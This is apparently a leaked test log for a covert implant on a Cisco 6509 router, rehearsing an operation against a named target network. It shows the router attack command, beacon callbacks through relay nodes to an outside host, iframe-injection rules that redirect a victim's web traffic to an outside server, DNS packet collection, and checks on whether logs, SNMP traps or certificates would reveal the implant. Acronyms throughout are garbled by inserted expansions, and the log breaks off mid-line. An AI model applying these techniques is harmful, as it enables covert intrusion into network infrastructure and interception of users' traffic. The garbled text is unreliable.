@@ -1,0 +1,528 @@
+
+                        Owner: User #71467
+Cytolysis-1h Testing
+HG was delivered for Cytolysis on 10/12/2015 for SUP720.  Testing scope will include SMITE, ACE, Redirection and Packet Collection capabilties.  
+ 
+CONOP will be:
+
+Hop through 3 flux nodes - 1 internet, 1 osmo subnet, 1 osmo mgmt subnet - and attack mgmt VLANVirtual Local Area Network 1 ip address - 0.108 from a host that is allowed vty access via acl 2
+Establish CTCounter Terrorism session back through flux node 4
+Use ACEApplication Control Engine (Module) commands to verify state of the device
+Use socket get_arp_survey_data and output of "show ip nat trans" to survey traffic from VLANVirtual Local Area Network 19
+SMITE hosts on target customer network - VLANVirtual Local Area Network 19
+
+Testing Summary
+
+Note in test report that module 2 is in state PwrDown and should be verified before proceeding
+5 second CPU spikes to around 40% during IACInternational Access Code attack
+Trigger packets that go through the target due to HG trigger sequence mis match will be caught and logged by outbound customer ACLs potentially - we will trigger to IP of device on port UDPUser Datagram Protocol 161.
+Comms packets are SSLv3 - need to consider if this is noticeable on this network
+Can only SMITE to /32 destinations
+HG-11 - Return web traffic that matches a SMITE rule is denied by ACL
+HG-12 - Print for return traffic
+Hardware difference between test device and target - daughter card on 4 port 10G line card is a WS-F6700-DFC3B on target.  Test device has a WS-F6700-DFC3BXL - difference seems to be in amount of memory/scalability.  Both support distributed forwarding, MPLS and ACEApplication Control Engine (Module) counters, however XL model has 1GB memory on interface module and can support 1 million ipv4 routes and 256KB netflow entries.  Target device 3B model has 256MB memory on interface module and can only support 256KB ipv4 route entries and 128KB netflow entries.
+
+Testing Notes
+VMs Used
+
+Cytolysis-ICON-Debian8
+Cytolysis-Seeds-Ubuntu
+Cytolysis-Victim1
+Cytolysis-Victim2
+Cytolysis-Victim3
+Cytolysis-Cust1-Host
+Cytolysis-Flux1
+Cytolysis-Flux2
+Cytolysis-Flux3
+Cytolysis-Flux4
+Windex
+
+Console connections
+
+6509 RP Slot 6: telnet 10.9.8.9 7013
+6509 RP Slot 5: telnet 10.9.8.9 7014
+4948-Osmo3   : telnet 10.9.8.9 7015
+3750G-Cust2  : telnet 10.9.8.9 7016
+3750-Cust1     : telnet 10.9.8.9 7017
+3750E-Osmo  : telnet 10.9.8.9 7018
+
+Device Setup
+
+6509E Chassis with the following linecards
+Slot 1 - WS-6148-GE-TX
+Slot 2 - WS-6148-GE-TX - powered down
+Slot 3 - WS-X6704-10GE
+Slot 4 - EMPTY
+Slot 5 - WS-SUP720-3B
+Slot 6 - WS-SUP720-3B
+
+
+DUT IOSApple operating system for small devices - sup-bootdisk:s72033-ipservices_wan-mz.122-33.SXI.bin
+DUT ROMRead-Only Memory - ROM: System Bootstrap, Version 12.2(17r)SX5, RELEASE SOFTWARE (fc1)
+
+OSPF running with Osmo-3 routers, rx equal-cost default route from two OSPFOpen Shortest Path First peers over Uplinks, along with other OSPFOpen Shortest Path First routes.
+Uplinks to Osmo-3 routers - one on 10G interface, other on 1G interface (target may actually have two 10G uplinks, however I do not have two 10G routers to link to).
+10GB Uplink uses ISL trunk encapsulation, 1GB uplink uses dot1q (that module on 6509 does not support ISL trunking)
+Customer 2 is the target traffic, Customer 1 is just additional traffic.  Customer routers replicated with 3750s.
+Customer 2 target network is NAT'd by the DUT
+Hop through three flux nodes to attack - one on Internet and two on Osmo network.  Final Flux node on CONTROL network hanging off Osmo router.
+SNMP monitoring, Syslog and trap logging set up to Solarwinds
+Port mirror set up for VLANVirtual Local Area Network 3 and 47
+Config differences between Target and DUT
+ip name server 4.4.4.4 added
+power mode combined
+no power enable module 2 - not sure why their slot 2 is PwrDown without this command
+g1/48 configured as an Uplink with dot1q encap and removed from SPAN for VLANVirtual Local Area Network 3,47
+logging/snmp host statements and acl 2 changed for 10.9.8.22
+added 1.1.1.1 as ntp server and added to acl Core-Net-filter-in.
+
+
+
+Tests
+
+Test 1 - Smoke Test of HG Install, CTCounter Terrorism Session Establishment and Uninstall
+Setup FLXFluxwire connection - 3 flux hops, final hop is XXX.XXX.X.XX (TOPWAY-NET[CN])
+
+Cytolysis set up running - snmp, logging, traps, ntp, ospf, seeds from Cust2 and Cust1
+Before IACInternational Access Code attack show memcytolysis-1#show mem Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)Processor 453AF410 381979632 102106504 279873128 276188548 210810104 I/O 8000000 67108864 13940548 53168316 53130480 53116124
+
+
+Before IACInternational Access Code attack show proc cpu
+cytolysis-1#show proc cpuCPU utilization for five seconds: 1%/0%; one minute: 1%; five minutes: 2% PIDProcess ID Runtime(ms) Invoked uSecs 5Sec 1Min 5Min TTYTeletype device Process 1 12 28 428 0.00% 0.00% 0.00% 0 Chunk Manager
+
+IAC attack proceeding:root@debian:/home/user1/ops/cytolysis/cytolysis-1h/attack/linux# ./iac --ip XXX.XXX.X.XXX (TOPWAY-NET[CN]) --l cisco:cisco ciscoLGDHMroot@debian:/home/user1/ops/cytolysis/cytolysis-1h/attack/linux#
+SNMP Trap observed during IACInternational Access Code attackccmHistoryEventCommandSource.4 = commandLine(1) ccmHistoryEventConfigSource.4 = 3 ccmHistoryEventConfigDestination.4 = 2 snmpTrapOID = CISCO-CONFIG-MAN-MIB:ciscoConfigManEvent sysUpTime = 15 minutes 56.80 seconds experimental.1057.1.0 = XXX.XXX.X.XX (TOPWAY-NET[CN]) snmpTrapEnterprise = CISCO-CONFIG-MAN-MIB:ciscoConfigManMIBNotificationPrefix
+
+CPU spike to 40% briefly during IACInternational Access Code attack
+
+Memory after IACInternational Access Code attack:cytolysis-1#show mem Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)Processor 453AF410 381979632 102115968 279863664 276164004 210810104 I/O 8000000 67108864 13940548 53168316 53130480 53116124
+
+No syslog  messages observed during IACInternational Access Code attack
+Proceeding with remote install:Result: 0x00000001
+During install - CPU hit 11% once and 19% right at the end.  Only two spikes.
+Show mem after installcytolysis-1#show mem Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)Processor 453AF410 381979632 104908616 277071016 276164004 208800940 I/O 8000000 67108864 13940548 53168316 53130480 53116124
+
+No syslog or SNMPSimple Network Management Protocol trap observed during installation
+Proceeding with CTCounter Terrorism session establishment:Had to chmod cytolysis.txt to 755 so that I could edit it.
+
+Setup bridge on Flux for 443 for CTCounter Terrorism session callback
+
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]> beacon call_base_back https XXX.XXX.X.XX (TOPWAY-NET[CN]) 443 -ii XXX.XXX.X.XX (TOPWAY-NET[CN])[Success] Trigger Sequence Number sent: 0************ Success ************[beacon call_base_back https XXX.XXX.X.XX (TOPWAY-NET[CN]) 443 -ii XXX.XXX.X.XX (TOPWAY-NET[CN])]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]>
+
+Accepted connection from XXX.XXX.X.XX (TOPWAY-NET[CN]):11814Attempting SSLSecure Socket Layer Handshake...SSL Handshake Successful![Success] New Key: WDHKc037O2DKUKBuGuKXtnIRlQzOLKnr7KKtVMnUewQ=************ Success ************[ilm listen cytolysis-1h.txt]
+CT session successful sending trigger to XXX.XXX.X.XX (TOPWAY-NET[CN]), and setting impersonate to same host
+No SNMPSimple Network Management Protocol trap or syslog generated during CTCounter Terrorism session establishment
+There are no snooped entries in the web, dns or https list - expected because this delivery does not have snooping enabled.
+socket get_arp_survey_data does show the seeds hosts:[XXX.XXX.X.XX (TOPWAY-NET[CN])]> socket get_arp_survey_data [Success]  Vlan: 0 Sender Protocol Address Sender Hardware Address Target Protocol Address Time Last Updated  10.11.0.10 00:50:56:88:5e:52 10.11.0.1 2015-10-29T20:37:32Z  XXX.XXX.X.XX (TOPWAY-NET[CN]) 00:50:56:88:3c:e4 XXX.XXX.X.XX (TOPWAY-NET[CN]) 2015-10-29T20:37:06Z ************ Success ************[socket get_arp_survey_data]
+
+Collected show tech with HG
+Proceeding with uninstall:[XXX.XXX.X.XX (TOPWAY-NET[CN])]> device uninstall_hg -mp -f
+Warning!!! This command will remove all capabilities. If installed, EVExecution Vector capabilities will be wiped, but MAY LEAVE BEHIND ARTIFACTS Memory permissions will be reset. See Operational Use Notes for more information. This connection will be terminated as a result of this command.
+Do you wish to continue? Enter yes or no: yes
+[Success] ************ Success ************[device uninstall_hg -mp -f]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]> [Remote Failure] ************ Remote Failure ************Connection to device lost!!
+>
+
+No SNMPSimple Network Management Protocol Trap observed during unisntall, no syslog
+CPU did not spike during uninstall
+Show mem after uninstall:cytolysis-1#show mem Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)Processor 453AF410 381979632 102149020 279830612 273348252 210747028 I/O 8000000 67108864 13940548 53168316 53130480 53116124
+
+Collected show tech after uninstall.
+
+
+Testing HG Module stop/start/restart
+After HG was installed and ran all weekend on the device, established a CTCounter Terrorism session to HG
+Executed module show:[XXX.XXX.X.XX (TOPWAY-NET[CN])]> module show[Success]  Name Version Boot Persistence State Address Path  Beachhead 11 No Running 0x47f8d2b4 default:Beachhead.mod  IV 19 No Running 0x47ad8e8c default:IV.mod  OSOperating System 26 No Running 0x47e2b5c8 default:OS.mod  Utility 16 Yes Running 0x47f92fdc default:Utility.mod  ACEApplication Control Engine (Module) 23 No Running 0x47e3593c default:ACE.mod  Beacon 21 Yes Running 0x47ee813c default:Beacon.mod  Broker 17 Yes Running 0x536edb1c default:Broker.mod Configuration 7 Yes Running 0x47e39ab4 default:Configuration.mod  Device 34 Yes Running 0x47ef2538 default:Device.mod  DNSDomain Name System 19 No Running 0x47ef973c default:DNS.mod  EBroker 8 No Running 0x536f3284 default:EBroker.mod  HTTPSHypertext Transfer Protocol Secure 18 No Running 0x47f0aea8 default:HTTPS.mod  MiniLZO 6 Yes Running 0x47f97d1c default:MiniLZO.mod  Packet 38 Yes Running 0x47f1ed7c default:Packet.mod  Persistence 1 Yes Running 0x47f04710 default:Persistence.mod  Process 33 Yes Running 0x47f15214 default:Process.mod  RC6 7 No Running 0x47f37ff0 default:RC6.mod  RFS 2 Yes Running 0x47f2f410 default:RFS.mod  Socket 19 Yes Running 0x47f4f95c default:Socket.mod  SWINE 16 No Running 0x47f46010 default:SWINE.mod  Trigger 22 Yes Running 0x4801b4c0 default:Trigger.mod  Uninstall 5 Yes Running 0x53841c0c default:Uninstall.mod  Web 4 Yes Running 0x538434c0 default:Web.mod  Name State Version Critical  Beachhead ModuleRunning 11 Yes  IV ModuleRunning 19 Yes  OSOperating System ModuleRunning 26 Yes  Utility ModuleRunning 16 Yes  ACEApplication Control Engine (Module) ModuleRunning 23 No Press <enter> to continue
+Beacon ModuleRunning 21 Yes  Broker ModuleRunning 17 Yes Configuration ModuleRunning 7 Yes  Device ModuleRunning 34 Yes  DNSDomain Name System ModuleRunning 19 Yes  EBroker ModuleRunning 8 Yes  HTTPSHypertext Transfer Protocol Secure ModuleRunning 18 Yes  MiniLZO ModuleRunning 6 Yes  Packet ModuleRunning 38 Yes  Persistence ModuleRunning 1 No  Process ModuleRunning 33 Yes  RC6 ModuleRunning 7 Yes  RFS ModuleRunning 2 No  Socket ModuleRunning 19 Yes  SWINE ModuleRunning 16 Yes  Trigger ModuleRunning 22 No  Uninstall ModuleRunning 5 No  Web ModuleRunning 4 Yes ************ Success ************[module show]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]>
+
+ACE - Start/Stop ACEApplication Control Engine (Module) module and restarted ACEMod - successful.  Subsequently issued ACEApplication Control Engine (Module) commands successfully.
+FilterBroker - had to start manually, it was not started.  Start/Stop FilterBroker module and restarted FilterBroker successfully.
+Attempted to stop Socket and DNSDomain Name System module however I received an error stating this was a critical module
+Started/Stopped and restarted the Trigger module
+Restarted FilterBroker module again - verified ability to run mtim status
+Restarted ACEMod again - verified ability to run ACEApplication Control Engine (Module) commands
+
+
+Ad -Hoc test - re-attack
+Started with a clean device - it had been reloaded but an IXIA test had been run on it
+Verified 3 flux hops in use
+Verified OSPFOpen Shortest Path First and logging
+IAC attacked - CPU spike during IACInternational Access Code attack - 39%
+Observed same SNMPSimple Network Management Protocol trap during IACInternational Access Code attack
+Uploaded HG - no trap or CPU issues
+Established CTCounter Terrorism session - notice very small spike during SSLSecure Socket Layer establishment - 15% in five second CPU
+When choosing a host to impersonate - chose 10.0.11.1 and it was NATd out and established back to my flx node as XXX.XXX.X.XX (TOPWAY-NET[CN]).
+Uninstalled HG with device uninstall -mp -f command
+Re-attacked with IACInternational Access Code and uploaded HG - established CTCounter Terrorism session successfully.
+Uninstalled again.
+Repeated attack again. successful
+Uninstalled again.
+Repeated attack again - successful
+All of these repeat attacks were on same RP, no failover or reload.  Will test repeat attacks after failover as part of sup failover testing.
+
+
+ACE Module capability testing
+HG installed from previous test
+Establish CTCounter Terrorism session and execute ACEApplication Control Engine (Module) commands - show ver, show ip int br, show module, show arp, show mac address-table, show log, show int vlan 1, show platform hardware capacity, sh tcam counts, show run, show run int vlan 2, wr mem, clear ip nat trans * (this killed my ct session), show access-list, show vlan, show ip route, show power, show environment, show ntp a, show ip sockets, show mod power, show mod integrity, show sup-bootflash:, clear arp, 
+Powered down line card in slot 2 at CLI
+No issues observed during power down of line card
+Disconnected and reconnected CTCounter Terrorism session
+Entered some incorrect commands to test boundaries - asdfhsaj, show *, show run | beg line <-cannot run this
+Attempting to run copy command "copy run sup-bootflash:" created a file called exit on the bootflash with the running config in it.  Deleted this file.
+Running "copy run sup-bootflash:config" also creates a file called exit.
+Running "delete sup-bootflash:config" via ACEApplication Control Engine (Module) does not delete the file
+None of the ACEApplication Control Engine (Module) commands show in output of "show history"
+show history does not seem to show the actual history - just has an entry for "show history"
+Documentation for ACEApplication Control Engine (Module) module says that only show commands are supported - maybe commands other than show should be blocked by ilm or CT.CMD: 'show mod ' 01:27:14 C6506 Fri Nov 6 2015CMD: 'show mod power' 01:27:19 C6506 Fri Nov 6 2015CMD: 'showcytolysis-1#
+
+
+
+OIR/shutdown/startup of modules with HG
+Powered module 2 up and down administratively 3 times with HG installed.  Verified CTCounter Terrorism session establishment between each state transition, no CTCounter Terrorism session during state transition.
+Powered up/down module 2 adminisitratively 3 times while CTCounter Terrorism session active.
+Disconnected HG session and performed 3 hw-module resets on slot 2. then verified ct session.
+Disconnected HG session and performed a hw-module reset on each slot 1 - 3 and then verified CTCounter Terrorism session
+With CTCounter Terrorism session active, performed an OIR card removal on slot 2.  Then disconnected and reconnected to CT
+With CTCounter Terrorism active, performed an OIR card insertion on slot 2 then disconnected and connected CT.
+
+
+SMITE capability Smoke Test
+With HG present from Test 5, verified Flux, OSPFOpen Shortest Path First and logging to solarwinds
+Started FilterBroker module
+Created a SMITE rule for any web traffic and found that even though HG said Remote Failure, unable to start filter assist, the rule was created but not enabled.[XXX.XXX.X.XX (TOPWAY-NET[CN])]> mitm show[Success] No Rules Found************ Success ************[mitm show]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]> mitm status[Success]  Enabled Rules: 0  Persisted Rules: 0  Active Sessions: 0 Sessions Affected: 0 ************ Success ************[mitm status]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]> mitm create http_iframe 10.11.0.10 255.255.255.255 0 0 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.0 80 80 "http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=1Z45RDJ" -en -bc -bk[Remote Failure] "Mitm Enable" command error:[FilterBroker 111] Unable to start filter assist************ Remote Failure ************[mitm create http_iframe 10.11.0.10 255.255.255.255 0 0 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.0 80 80 http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=1Z45RDJ -en -bc -bk]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]> mitm show[Success] Actions Available:  Action: HTTPHypertext Transfer Protocol IFRAMEEmbedded Webpage  Version: 3  Number of Rules: 1  Rules:  ID: 4  Type: HTTPHypertext Transfer Protocol IFRAMEEmbedded Webpage  Enabled: No  Persistent: No Persistent State: --  Source IP: 10.11.0.10/32  Dest IP: X.X.X.XX (LVLT-GOGL-8-8-8[US])/24  Action Data: http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=1Z45RDJ************ Success ************[mitm show]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]>
+
+
+Talked to Charlie/Xetron - the rule was not enabled because with this platform, can only SMITE to /32 destinations.
+Created a new rule - mitm create http_iframe 10.11.0.13 255.255.255.255 0 0 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.255 80 80 "http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=1Z45RDJ" -en -bc -bk
+Observed that when I try to web browse from victim, page doesn't load properly and iframe is not injected
+Observed the following log message on console - it looks like return traffic from web server is being denied:Nov 10 00:18:30.568 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(80) (Vlan2 0015.fa80.efbf) -> 10.11.0.13(1430), 1 packet
+
+Reloaded DUTDevice Under Test to start with a clean device
+Tested browsing to three different servers - X.X.X.XX (LVLT-GOGL-8-8-8[US]), 100.100.40.3 and 100.100.40.4 from the 10.11.0.13 host and was successful.  Did not record any denies on acl.
+IAC attacked and repeated web browsing successfully.
+Installed HG and repeated web browsing successfully.
+Established CTCounter Terrorism session and repeated browsing successfully
+Started FilterBroker and repeated browsing successfully.
+Added SMITE rule and i was unable to browse and I saw the error message when hitting web server that matches SMITE rule.  Web traffic that did not match SMITE rule proceeded normally.mitm create http_iframe 10.11.0.13 255.255.255.255 0 0 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.255 80 80 "http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?" -en -bc -bk
+Created HG-11 and sent to Xetron
+
+
+Test Packet Collection
+Will smoke test packet collection of DNSDomain Name System packets to identify DNSDomain Name System servers in use by target hosts and web destinations per the CONOPConcealed Operation discussion
+Verified Seeds traffic is working from VLANVirtual Local Area Network 3 and VLANVirtual Local Area Network 19
+Enabled a packet collection rule - collect create 0.0.0.0 0.0.0.0 53 53 10.11.0.13 255.255.255.255 udp -en -t 15s
+When rule is enabled, traffic doesn't flow and nothing is collected
+Tried several variations on the rule and found that if I use 4.4.4.4 as the destination host, the traffic stops, but i do actually get collection results
+
+
+Generating Baseline performance test
+Running two hour test with no HG - HG was uninstalled and then device was powered off for 20seconds and then powered back up
+Ran IXIA for 2 hour test.
+Collected results - Cytolysis-1h_56-Baseline-no-hG-Test8
+
+
+Generate Another Baseline with more traffic
+Running two hour test with no HG - same test as test 8 except with more traffic flowing through
+Collected results - Cytolysis-1h_58-Baseline-no-HG-Test9
+
+
+Performance test - same as Test 9 but with HG, no rules active
+test kicked off at 2:30PM on Friday
+compared results of test 9 and 10.  Found no difference in CPU % as reported by Solarwinds.  Found only small difference in Used memory in solarwinds, which is expected because with HG installed, output of show mem does show some additional used memory.  Difference in memory was - 25.9% utilized without HG, 26.6% utilized with HG
+IXIA report - no significant difference in report observed in the following areas - Agg Appsim - IP Summary, TCPTransport Control Protocol Setup time, TCPTransport Control Protocol Response Time, TCPTransport Control Protocol close time, TCPTransport Control Protocol summary, Frame latency summary, UDPUser Datagram Protocol summary.  Under Component summary, the Maximum Client Establish rate was lower with HG installed - 8990 vs 5330.  This is something to watch with subsequent tests of performance with either rules active or with additional traffic.  In this same section, TCPTransport Control Protocol flow rate was lower with HG as well.   Application Summary showed only a handful more errors with HG (~100).
+Checked individual component stats in test report and it seems that cust1 component performed well - the other three are the ones with the decreased rate of max client establishment/TCP flow rate.  Those three all involve subnet flx2, whlie cust1 test flows to services.  Could be something to investigate - whether there is an issue with sending traffic out the uplink interface on vlan 2 versus sending traffic to other interfaces/vlans on the DUT.
+
+
+Opsec review
+Observed known issues in show tech - init process missing from show stacks and output of show mem shows higher Used mem with HG
+After HG uninstalled - Init process back, no anamolous output
+
+
+Ad-hoc - Administrator commands testing
+with HG installed, perform system administrator functions, kicked off ixia to run background traffic
+Added and deleted vlan interface and associated vlan, various show commands, bounced vlan 2 interface, added/deleted a user, clear counters, clear access-list counters, clear cef table
+Observed that IP that I am impersonating for CTCounter Terrorism session has a receive adj when directly queried however does not show up in show ip cef detail.  Also ping to that host failed until I disconnected CTCounter Terrorism session, at which point the cef RAA was dropped and traffic to that host resumed.  This is expected behavior based on HG-11.
+test cef commands, test diagnostic all on slot 3, show tech, show ip cef commands (known observables), created and deleted new port mirror, changed console and buffer logging levels, clear arp and clear mac address table, deleted and re-added acl from vty lines, deleted and re-added acl from vlan 2 and vlan 19, term len 0, show run
+
+
+Ad-hoc test - Add latency to ICON machine
+Uninstalled HG
+Added latency - 1000ms to ICON workstation
+IAC attacked - IACInternational Access Code attack failed - LG ECEdgeCase 133 DHE - 133 is "Router issue command failed".  Follow up to see if this is related to re-attack or additional latency.
+Reduced latency to 500ms - IACInternational Access Code attack - Attack and HG upload successful 0- LGDTHM
+Established CTCounter Terrorism session successfully with 500ms
+Uninstalled HG and reloaded DUTDevice Under Test to try again with 1000ms of latency - successfully attacked and installed, establsihed CTCounter Terrorism session with latency
+Repeated test with 1000 ms successfully
+
+
+Verifying result of performance testingRan iterations 61 and 62 of same test - reload DUT, then run test each time.  Generated a comparison report.  Results are not 100% consistent with previous results.  Still looking into report.
+
+Run Stack Scrambler test with HG installed - 2h
+Ran Stack Scrambler test with HG installed - 8 hour - no crashes or prints
+Ad hoc test - reload during HG upload
+Started with a clean DUT
+IAC attacked
+Reloaded Device at 97% HG upload complete
+Verified no prints or traps sent, router reloaded normally
+Successfully re-attacked and uploaded HG
+
+
+Ad hoc - perform admin functions during HG upload
+performed show tech during HG upload
+bounced power to module 2 during Hg upload
+Performed show commands
+DId not obbserve any anamolous output on console or traps
+
+
+Ad hoc - collect wireshark of comms traffic
+collected with wireshark on ICON machine while establishing CTCounter Terrorism session
+ct-session.pcapng saved to / on ICON
+SSLv3 packets
+Certificate handed out by Cutthroat is the same as used in previous releases of HG - need to confirm but this is signature issue
+
+
+
+IXIA test - without interface commands
+With HG installed Increased IXIA traffic to 100k flows and 10M on IXIA - observed many failures
+Removed ip verify unicast commands from VLANVirtual Local Area Network 19 - observed many failures
+Removed acls from vlan 2 and vlan 19 - observed many errors
+Removed nat statements - router crashed.  Collected show info
+Reloaded DUTDevice Under Test and configured with no ip verify unicast, no acls and no nat
+Started traffic - running without errors - still no HG at this time
+During test, IACInternational Access Code attacked and installed HG, established CTCounter Terrorism session, uninstalled HG - no errors
+Reloaded and added back all interface and acl configurations
+Running test with no HG, 10M traffic and 1000 superflows with success.
+
+
+
+SUP Failover testing
+Test sup fails over due to primary pulled
+Test sup fails over due to primary crash
+
+Test sup fails over due to manual force
+With IXIA traffic running, HG installed
+Laid down an assist with HG by creating a SMITE rule for 
+
+
+
+
+
+Mointoring CPU and punted packets during IXIA test with and without HG
+Reloaded DUTDevice Under Test to start with a clean device
+
+Verified CPU levels for SP, RP and DFC in slot 3 -  cytolysis-1#show proc cpuCPU utilization for five seconds: 0%/0%; one minute: 1%; five minutes: 1%
+cytolysis-1#remote command switch show proc cpu
+CPU utilization for five seconds: 17%/1%; one minute: 14%; five minutes: 14%
+cytolysis-1-cfc3#show proc cpuCPU utilization for five seconds: 0%/0%; one minute: 1%; five minutes: 1%
+
+Verified packet queues - no packets queued
+Verified what is going to RP - src 10.11.0.10 - dns to 4.4.4.4, 443 to X.X.X.XX (LVLT-GOGL-8-8-8[US]), icmp to X.X.X.XX (LVLT-GOGL-8-8-8[US]). src XXX.XXX.X.XX (TOPWAY-NET[CN]) - only ICMPInternet Control Message Protocol to XXX.XXX.X.XX (TOPWAY-NET[CN]).
+Installed HG and verified all three CPUs - values were the same within 1%.  
+Verified that netdr command is seeing the change in RP traffic due to HG assist on CTCounter Terrorism impersonated host
+Kicked off IXIA test - CPU looks normal so far - around 6% for RP, same level as before for SP and DFC
+
+
+Testing new version of IACInternational Access Code - had previously completed a smoke test of new IAC
+Kicked off IXIA test - Cytolysis High
+Uninstalled HG
+Verified Solarwinds not currently loogging any SNMPSimple Network Management Protocol traps and monitoring tcpdump on 4.4.4.4 for DNSDomain Name System queries from XXX.XXX.X.XX (TOPWAY-NET[CN])
+
+Re-attacked with IAC
+IAC attack completed without sending any SNMPSimple Network Management Protocol traps or DNSDomain Name System queries
+Uploaded HG and established CTCounter Terrorism session with no problem
+Unininstalled HG
+Repeated three times
+Attacked with IACInternational Access Code three times in a row - no traps or dns queries, output shows LGDTHM
+Uploaded HG
+Tested with ACEApplication Control Engine (Module) using show users command - show users issues through ACEApplication Control Engine (Module) does not initiate a DNSDomain Name System query, even with a separate login
+Increased CUst2 IXIA traffic to 10k flows.  Failure rate increased as expected
+Allowed test to run for maybe ten minutes with failures incrememting
+Uninstalled HG through CLICommand-Line Interface and let the test run for ten more minutes - about 15k active translations
+Re-attacked and installed HG, establish CTCounter Terrorism session
+Created a smite rule for an IXIA source and destination from 10.11.0.50 to XXX.XXX.XX.XX (TOPWAY-NET[CN]).
+Monitored packet assist - hihgest observed was 310 packets per second
+Verified assist was in place with show ip cef <ip>
+RP/SP/DFC CPU was not impacted by the one SMITE rule.
+Deleted and re-added the rule several times
+Reset the stats for packet assist by re-entering packet assist parameters 1500/3000
+Added the rule but not enabled, enabled, then disabled and deleted the rule
+Created three rules to different destinations, verified show ip cef receieve adjacencies.  packet assist threshold at 300
+Exceeded packet assist threshold and assists did drop.  Rules still appear to be enabled however.  disabling and re-enaling rule re-establishes the assist.
+
+
+Test assist remove
+Created a mitm iframe rule, verified the assist in show ip cef.
+Performed a device uninstall - verified that the assist was dropped after a few seconds.
+
+
+CPU Scaling test
+Adjusted IXIA cust 2 levels to 1000 flows and 5M in order to simulate what I see in show proc cpu hist on target
+Verified CPU levels and installed HG to see impact on overall level (nto 5s CPU)
+At these traffic levels, HG seemed to add about 2% to 1min/5 minute CPU
+
+
+Performance characterization - collecting all three CPUs and memory without traffic and hg, with traffic-no hg, with traffic and hg
+Found that HG install added maybe 1% to RP CPU, SP CPU and nothing to linecard CPU  - files saved in testing folder.
+Reloaded device at 10:05.  No HG and no traffic for several hours - only seeds from cust1host. Collected SWSoftware and show proc cpu data.
+Added new HG delivery Friday morning - allow to run over the weekend with no traffic - only seeds from cust1host.  Confirmed no SNMPSimple Network Management Protocol Trap or DNSDomain Name System query during IAC.  Peak CPU during IACInternational Access Code was 62%.  Peak CPU during HG upload was 18%.  These were only 5 second values.  Screenshots show reported Solarwinds values.
+Verified that new delivery fixes IACInternational Access Code and filterbroker module starts automatically now.  Exited CTCounter Terrorism session.
+
+
+Smoke test of features
+Ran through all ACEApplication Control Engine (Module) commands documented on Cytolysis page as well as socket get_arp_survey_data
+Opened Victim3 and web browsed to google - saw the following print:cytolysis-1#Nov 27 19:57:09.354 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(80) (Vlan2 0015.fa80.efbf) -> 10.11.0.13(3796), 1 packet
+In addition page didn't load completely - first two pictures loaded only.
+
+Cleared cache on Victim 3 and repeated browsing to google, this time successful page load and no print.  Repeated this three times with no further problem.
+Waiting for nat to clear out and then repeating the attempted web browsing.  While waiting for NATNetwork Address Translation to clear out, rx the print again, although I was not actively browsing and IEInternet Explorer was closed:cytolysis-1#Nov 27 20:02:10.862 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(80) (Vlan2 0015.fa80.efbf) -> 10.11.0.13(3796), 40 packets
+
+After nat cleared, attempted to browse again, this time successfully with no print.
+Browsed successfully for the first time to 100.100.40.3 and 100.100.40.4 successfully as well, no print.
+went down to get lunch, came back and attempting again to browse after cache cleared and it sat for a bit.
+All three pages loaded successfully.
+Trying from victim1 -
+Confluence lost a bunch of notes, trying to recreate them
+I was able to browse successfully from all other hosts with no prints.
+Created iframe rule to match victim 3.  At first i just web browsed from other hosts to X.X.X.XX (LVLT-GOGL-8-8-8[US]) to make sure that still worked and it did, no problems.  then i tried from victim 3 - unsuccessful exploitation and also prints:Nov 27 20:41:46.263 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(8888) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(3839), 1 packetNov 27 20:44:54.519 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(8888) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(3843), 1 packetNov 27 20:47:12.311 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(8888) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(3839), 6 packetsNov 27 20:49:18.107 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(3885), 1 packetNov 27 20:50:12.407 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(8888) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(3843), 6 packetscytolysis-1#Nov 27 20:55:55.355 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(3980), 1 packetNov 27 20:56:24.075 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(8888) (Vlan2 